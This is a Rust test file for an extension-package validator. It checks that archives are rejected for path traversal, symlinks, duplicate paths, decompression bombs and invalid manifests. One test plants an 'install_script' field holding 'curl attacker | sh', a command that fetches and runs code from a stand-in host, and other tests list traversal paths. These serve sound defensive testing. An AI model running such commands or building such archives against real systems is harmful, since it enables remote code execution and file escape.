use std::io::Write;

use anyhow::Result;
use ejm_harness_package_spec::{Manifest, read_archive, validate_relative_path};
use flate2::{Compression, write::GzEncoder};
use serde_json::json;

fn manifest() -> Vec<u8> {
    serde_json::to_vec(&json!({
        "schema_version": 1, "name": "@example/review", "version": "1.0.0",
        "description": "Review changed files", "runtime": { "kind":"node", "entry":"extension.ts" },
        "exports": { "hooks": [{ "event":"run_start", "handler":"prepare" }] }
    }))
    .unwrap_or_default()
}

fn archive(files: &[(&str, &[u8])]) -> Result<Vec<u8>> {
    let gzip = GzEncoder::new(Vec::new(), Compression::fast());
    let mut tar = tar::Builder::new(gzip);
    for (name, bytes) in files {
        let mut header = tar::Header::new_gnu();
        header.set_size(u64::try_from(bytes.len())?);
        header.set_mode(0o644);
        header.set_cksum();
        tar.append_data(&mut header, name, *bytes)?;
    }
    Ok(tar.into_inner()?.finish()?)
}

#[test]
fn archive_round_trip_uses_shared_manifest_contract() -> Result<()> {
    let bytes = archive(&[
        ("ejm.package.json", &manifest()),
        ("extension.ts", b"export const prepare = () => 'hello';"),
    ])?;
    let package = read_archive(&bytes)?;
    assert_eq!(package.manifest.name, "@example/review");
    assert_eq!(package.files.len(), 2);
    Ok(())
}

#[test]
fn rejects_portable_path_aliases_and_traversal() {
    for path in [
        "../escape",
        "/root",
        "a/../x",
        "a\\x",
        "x:stream",
        "CON.txt",
        "a/./x",
        "a//x",
        ".git/config",
        "dir/file.",
        "NUL",
    ] {
        assert!(validate_relative_path(path).is_err(), "{path}");
    }
}

#[test]
fn rejects_duplicate_paths_missing_entry_and_links() -> Result<()> {
    let duplicate = archive(&[
        ("ejm.package.json", &manifest()),
        ("extension.ts", b"one"),
        ("EXTENSION.TS", b"two"),
    ])?;
    assert!(read_archive(&duplicate).is_err());
    assert!(read_archive(&archive(&[("ejm.package.json", &manifest())])?).is_err());
    let mut tar = tar::Builder::new(GzEncoder::new(Vec::new(), Compression::fast()));
    let mut header = tar::Header::new_gnu();
    header.set_entry_type(tar::EntryType::Symlink);
    header.set_size(0);
    header.set_mode(0o777);
    header.set_link_name("../../outside")?;
    header.set_cksum();
    tar.append_data(&mut header, "extension.ts", &[][..])?;
    assert!(read_archive(&tar.into_inner()?.finish()?).is_err());
    Ok(())
}

#[test]
fn rejects_decompression_bomb_before_tar_parsing() -> Result<()> {
    let mut gzip = GzEncoder::new(Vec::new(), Compression::fast());
    for _ in 0..33 {
        gzip.write_all(&vec![0; 1024 * 1024])?;
    }
    assert!(read_archive(&gzip.finish()?).is_err());
    Ok(())
}

#[test]
fn rejects_namespace_aliases_and_unknown_manifest_fields() -> Result<()> {
    let mut value: serde_json::Value = serde_json::from_slice(&manifest())?;
    for name in [
        "example/name",
        "@EXAMPLE/name",
        "@x/../y",
        "@a/a/other",
        "@-a/b",
    ] {
        value["name"] = name.into();
        assert!(Manifest::from_bytes(&serde_json::to_vec(&value)?).is_err());
    }
    value["name"] = "@example/review".into();
    value["install_script"] = "curl attacker | sh".into();
    assert!(Manifest::from_bytes(&serde_json::to_vec(&value)?).is_err());
    Ok(())
}
